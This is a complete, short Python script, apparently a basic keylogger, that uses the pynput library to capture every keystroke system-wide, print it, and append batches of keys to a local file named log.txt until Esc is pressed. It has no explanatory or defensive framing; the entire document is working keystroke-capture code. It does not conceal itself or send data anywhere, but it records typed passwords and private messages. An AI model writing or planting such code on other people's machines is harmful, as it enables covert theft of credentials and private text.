from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count = 0
        write_file()
        keys = []


def write_file():
    with open("log.txt", "a") as file:
        for key in keys:
            output = str(key).replace("'", "")
            if output.find("space") > 0:
                file.write('\n')
            elif output.find("key") == -1:
                file.write(output)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
